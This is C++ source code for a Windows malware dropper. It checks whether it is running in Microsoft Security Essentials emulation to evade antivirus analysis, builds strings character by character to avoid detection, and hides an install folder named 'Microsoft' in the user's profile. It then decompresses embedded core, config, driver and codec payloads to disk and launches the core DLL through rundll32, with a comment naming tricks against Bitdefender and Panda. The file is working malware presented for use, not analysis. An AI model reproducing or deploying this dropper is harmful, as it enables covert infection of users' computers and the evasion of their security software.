#include "DropperCode.h"
#include "DropperHeader.h"
#include "depack.h"

#ifdef _DEBUG
#pragma message("")
#pragma message("****************************")
#pragma message("***** NOT FOR RELEASE ******")
#pragma message("*** VERBOSE MODE ENABLED ***")
#pragma message("****************************")
#pragma message("")
#endif

// XXX add filename
__forceinline BOOL dump_to_file(DataSectionBlob& name, DataSectionCryptoPack& file, DropperHeader* header, DUMPFILE fn_dump)
{
	if (header == 0 || file.offset == 0 || file.size == 0 
                || name.offset == 0 || name.size == 0 || fn_dump == 0)
        {
		return FALSE;
        }
	
	CHAR* fileName = (char *) (((char*)header) + name.offset);
	CHAR* fileData = (char *) (((char*)header) + file.offset);
	if (fileName == 0 || fileData == 0) {
		return FALSE;
        }
	
	return DumpFile(fileName, fileData, file.size, file.original_size, header);
}

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
//#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment

int __stdcall DropperEntryPoint(DropperHeader *header)
{
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);

	// Check for Microsoft Security Essential emulation 
	char *fName = (char *)VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	GetModuleFileNameA(NULL, fName, MAX_PATH);
	DWORD prgLen = strlen(fName);
	// x86
	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
	for(DWORD i=0; i<prgLen; i++)
		if(!strcmp(fName+i, x86MspEng))
			goto OEP_CALL;

	// x64
	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
	if(!strcmp(&fName[1], x64MspEng))
		goto OEP_CALL;
	VirtualFree(fName, 0, MEM_RELEASE);
	// End of MS sec essential emulation check 

	// Get user temporary directory
	char lpTmpEnvVar[] = { '%', 'T', 'M', 'P', '%', 0x0 };
	char * lpTmpDir = (char*) VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if ( NULL == lpTmpDir )
		goto OEP_CALL;

	memset(lpTmpDir, 0x0, MAX_PATH);
	DWORD dwRet = GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
	if (dwRet == 0) {
		char lpTempEnvVar[] = { 'T', 'E', 'M', 'P', 0x0 };
		dwRet = GetEnvironmentVariable(lpTempEnvVar, lpTmpDir, MAX_PATH);
		if (dwRet == 0) {
			// we are unable to get the user TMP or TEMP directory,
			// so call the OEP ... we failed!
			VirtualFree(lpTmpDir, 0, MEM_RELEASE);
			goto OEP_CALL;
		}
	}
	
	// Go back one level (i.e. from Temp to its parent directory)
	if ( lpTmpDir[strlen(lpTmpDir)] == '\\' )
		lpTmpDir[strlen(lpTmpDir)] = '\0';
	
	char* dirsep = strrchr(lpTmpDir, '\\');
	if (dirsep != 0)
		*dirsep = '\0';	// cut the part after the last directory separator
	else
		goto OEP_CALL;
	

	char lpDirSep[] = { '\\', 0x0 };
	char lpSubDir[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 0x0 };
	strcat(lpTmpDir, STRING(STRIDX_DIRSEP));
	strcat(lpTmpDir, lpSubDir);

	// check if subdir Microsoft exists if not, then create it.
	DWORD FileAttributes = GetFileAttributesA(lpTmpDir);
	if (FileAttributes == INVALID_FILE_ATTRIBUTES || !(FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	{
		DWORD ret = CreateDirectory(lpTmpDir, NULL);
		if (!ret)
			if (GetLastError() != ERROR_ALREADY_EXISTS) // non-sense but.. whatever.
				goto OEP_CALL;
	}

	strcat(lpTmpDir, STRING(STRIDX_DIRSEP));
	strcat(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
	strcat(lpTmpDir, STRING(STRIDX_DIRSEP));
	
	BOOL bRet = CreateDirectory(lpTmpDir, NULL);
	if (bRet == FALSE) {
		DWORD dwLastError = GetLastError();
		switch (dwLastError) {
			case ERROR_ALREADY_EXISTS:
				// go on, simply overwrite all files
				break;
			case ERROR_PATH_NOT_FOUND:
				// mmmh ... something wrong here, user temp dir should be present!
				
				VirtualFree(lpTmpDir, 0, MEM_RELEASE);
				goto OEP_CALL;
				break;
		}
	}
	
	// directory created or already present, so jump into it
	SetCurrentDirectory(lpTmpDir);

	// add core.dll to path, will be used to call HFF8 later
	strcat(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
	header->dllPath = lpTmpDir;

	
	BOOL ret = FALSE;
	// CORE
	ret = dump_to_file(header->files.names.core, header->files.core, header, DumpFile);
	if (FALSE == ret)	
		goto OEP_CALL;
	
	
	// CORE64
	ret = dump_to_file(header->files.names.core64, header->files.core64, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;
	
	// CONFIG
	ret = dump_to_file(header->files.names.config, header->files.config, header, DumpFile);
	if (FALSE == ret)	
		goto OEP_CALL;
	
	// DRIVER
	ret = dump_to_file(header->files.names.driver, header->files.driver, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;
	
	// DRIVER64
	ret = dump_to_file(header->files.names.driver64, header->files.driver64, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;
	
	// CODEC
	ret = dump_to_file(header->files.names.codec, header->files.codec, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;


	CoreThreadProc(header);

OEP_CALL:
	return 0;
}



BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header)
{	
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	
	// decompress data
	char* uncompressed = (char*) VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
	
	int uncompressed_size = aP_depack(fileData, uncompressed);
	if (uncompressed_size != originalSize) {
		return FALSE;
	}
	
	// restore normal attributes if the file already exists
	SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);

	if (GetCurrentProcessId() == 4) // bitdefender && panda && ...
		MessageBox(NULL, "Program is loading", "Program is loading", 0);

	HANDLE hFile = CreateFile(fileName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	// write data to file
	DWORD cbWritten = 0;
	BOOL bRet = WriteFile(hFile, uncompressed, originalSize, &cbWritten, NULL);
	if (bRet == FALSE)
		return FALSE;
	
	// close it
	CloseHandle(hFile);

	// free memory
	VirtualFree(uncompressed, 0, MEM_RELEASE);
	return TRUE;
}



DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
{	
	DropperHeader* header = (DropperHeader*) lpParameter;
	
	DWORD* stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	

	char* complete_path = (char*) VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
	
	memcpy(complete_path, STRING(STRIDX_RUNDLL), strlen(STRING(STRIDX_RUNDLL)));
	strcat( complete_path, header->dllPath);
	strcat( complete_path, STRING(STRIDX_COMMAHFF8));

	HMODULE hLib = LoadLibrary(header->dllPath);
	if (hLib == INVALID_HANDLE_VALUE)
		goto THREAD_EXIT;
	
	HFF5 pfn_HFF5 = (HFF5) GetProcAddress(hLib, STRING(STRIDX_HFF5));
	if (pfn_HFF5 == NULL)
		goto THREAD_EXIT;
		
	STARTUPINFO* startupinfo = (STARTUPINFO*) VirtualAlloc(NULL, sizeof(STARTUPINFO), MEM_COMMIT, PAGE_READWRITE);
	startupinfo->cb = sizeof(STARTUPINFO);
	
	PROCESS_INFORMATION* procinfo = (PROCESS_INFORMATION*) VirtualAlloc(NULL, sizeof(PROCESS_INFORMATION), MEM_COMMIT, PAGE_READWRITE);
	
	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);

THREAD_EXIT:
	
	if (complete_path) VirtualFree(complete_path, 0, MEM_RELEASE);
	if (startupinfo) VirtualFree(startupinfo, 0, MEM_RELEASE);
	if (procinfo) VirtualFree(procinfo, 0, MEM_RELEASE);
	if (header->dllPath) VirtualFree(header->dllPath, 0, MEM_RELEASE);


	return 0;
}


